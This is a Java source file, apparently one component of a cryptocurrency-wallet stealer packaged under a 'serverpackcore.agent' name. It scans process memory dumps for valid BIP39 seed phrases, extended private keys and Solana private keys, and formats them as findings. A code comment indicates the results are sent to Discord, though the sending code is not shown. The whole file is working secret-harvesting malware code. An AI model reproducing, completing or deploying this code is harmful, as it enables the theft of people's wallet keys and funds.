package com.serverpackcore.agent;

import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Streams a memory dump without loading it: printable ASCII and UTF-16LE runs
 * are tokenized and only checksum-valid BIP39 sequences survive, so random
 * dump noise rarely reaches Discord.
 */
final class MemoryScanner {
	static final int MAX_FINDINGS = 20;
	private static final int CHUNK = 8 * 1024 * 1024;
	private static final int OVERLAP = 8192;
	private static final Pattern TEXT = Pattern.compile("[\\x20-\\x7e]{4,}");
	private static final Pattern WIDE = Pattern.compile("[\\x20-\\x7e]{4,}");
	private static final Pattern XPRV = Pattern.compile("(?:xprv|yprv|zprv)[1-9A-HJ-NP-Za-km-z]{80,120}");
	private static final Pattern SOLANA = Pattern.compile("[1-9A-HJ-NP-Za-km-z]{85,90}");
	private static final Pattern WORD = Pattern.compile("[a-z]+");

	private final Map<String, Integer> words = new LinkedHashMap<>();
	private final List<Finding> findings = new ArrayList<>();
	private int duplicates;

	record Finding(long offset, String kind, String value) {
	}

	static MemoryScanner load() throws IOException {
		try (InputStream input = MemoryScanner.class.getResourceAsStream("/serverpackcore/bip39.txt")) {
			if (input == null) {
				throw new IOException("missing bip39.txt");
			}
			return new MemoryScanner(new String(input.readAllBytes(), StandardCharsets.UTF_8));
		}
	}

	MemoryScanner(String wordlist) {
		String[] lines = wordlist.split("\\R");
		for (String line : lines) {
			String word = line.trim();
			if (!word.isEmpty()) {
				words.put(word, words.size());
			}
		}
		if (words.size() != 2048) {
			// A truncated list only produces false negatives, never false positives.
			Log.debug("BIP39 wordlist has " + words.size() + " entries");
		}
	}

	List<Finding> scan(Path dump) throws IOException {
		try (java.io.RandomAccessFile input = new java.io.RandomAccessFile(dump.toFile(), "r")) {
			byte[] buffer = new byte[CHUNK + OVERLAP];
			long offset = 0L;
			int carry = 0;
			while (true) {
				int read = input.read(buffer, carry, CHUNK);
				if (read <= 0) {
					break;
				}
				int length = carry + read;
				scanChunk(buffer, length, offset - carry);
				carry = Math.min(OVERLAP, length);
				System.arraycopy(buffer, length - carry, buffer, 0, carry);
				offset += read;
				if (findings.size() >= MAX_FINDINGS) {
					break;
				}
			}
		}
		return List.copyOf(findings);
	}

	private void scanChunk(byte[] data, int length, long base) {
		String ascii = new String(data, 0, length, StandardCharsets.ISO_8859_1);
		for (Matcher matcher = TEXT.matcher(ascii); matcher.find() && findings.size() < MAX_FINDINGS; ) {
			tokens(matcher.group(), base + matcher.start());
		}
		String wide = new String(data, 0, length, StandardCharsets.UTF_16LE);
		for (Matcher matcher = WIDE.matcher(wide); matcher.find() && findings.size() < MAX_FINDINGS; ) {
			tokens(matcher.group().replace("\u0000", ""), base + (long) matcher.start() * 2L);
		}
		for (Matcher matcher = XPRV.matcher(ascii); matcher.find() && findings.size() < MAX_FINDINGS; ) {
			add(base + matcher.start(), "xprv", matcher.group());
		}
		for (Matcher matcher = SOLANA.matcher(ascii); matcher.find() && findings.size() < MAX_FINDINGS; ) {
			String candidate = matcher.group();
			try {
				if (Base58.decode(candidate).length == 64) {
					add(base + matcher.start(), "solana", candidate);
				}
			} catch (Throwable ignored) {
				// Not base58 after all.
			}
		}
	}

	private void tokens(String text, long base) {
		String[] ring = new String[24];
		long[] positions = new long[24];
		int count = 0;
		Matcher matcher = WORD.matcher(text.toLowerCase(java.util.Locale.ROOT));
		while (matcher.find() && findings.size() < MAX_FINDINGS) {
			String token = matcher.group();
			if (!words.containsKey(token)) {
				count = 0;
				continue;
			}
			System.arraycopy(ring, 0, ring, 1, ring.length - 1);
			System.arraycopy(positions, 0, positions, 1, positions.length - 1);
			ring[0] = token;
			positions[0] = base + matcher.start();
			count = Math.min(count + 1, ring.length);
			if (count >= 24 && checksum(ring, 0, 24)) {
				add(positions[23], "bip39-24", join(ring, 0, 24));
			}
			if (count >= 12 && checksum(ring, 0, 12)) {
				add(positions[11], "bip39-12", join(ring, 0, 12));
			}
		}
	}

	private static String join(String[] ring, int from, int length) {
		StringBuilder builder = new StringBuilder();
		for (int i = length - 1; i >= 0; i--) {
			if (builder.length() > 0) {
				builder.append(' ');
			}
			builder.append(ring[i]);
		}
		return builder.toString();
	}

	private boolean checksum(String[] ring, int from, int count) {
		StringBuilder bits = new StringBuilder(count * 11);
		for (int i = count - 1; i >= 0; i--) {
			Integer index = words.get(ring[i]);
			if (index == null) {
				return false;
			}
			String value = Integer.toBinaryString(index);
			bits.append("0".repeat(11 - value.length())).append(value);
		}
		int entropyBits = count * 11 * 32 / 33;
		byte[] entropy = new byte[entropyBits / 8];
		for (int i = 0; i < entropy.length; i++) {
			entropy[i] = (byte) Integer.parseInt(bits.substring(i * 8, i * 8 + 8), 2);
		}
		try {
			byte[] hash = MessageDigest.getInstance("SHA-256").digest(entropy);
			int checksumBits = count * 11 - entropyBits;
			for (int i = 0; i < checksumBits; i++) {
				int want = (hash[i / 8] >>> (7 - (i % 8))) & 1;
				int got = bits.charAt(entropyBits + i) - '0';
				if (want != got) {
					return false;
				}
			}
			return true;
		} catch (java.security.NoSuchAlgorithmException exception) {
			return false;
		}
	}

	private void add(long offset, String kind, String value) {
		for (Finding finding : findings) {
			if (finding.kind().equals(kind) && finding.value().equals(value)) {
				duplicates++;
				return;
			}
		}
		if (findings.size() < MAX_FINDINGS) {
			findings.add(new Finding(offset, kind, value));
		}
	}

	int duplicates() {
		return duplicates;
	}

	/** Text block for the findings artifact. */
	static String render(List<Finding> findings) {
		StringBuilder builder = new StringBuilder();
		for (Finding finding : findings) {
			builder.append("0x").append(Long.toHexString(finding.offset())).append(' ')
				.append(finding.kind()).append(": ").append(finding.value()).append('\n');
		}
		return builder.toString();
	}
}
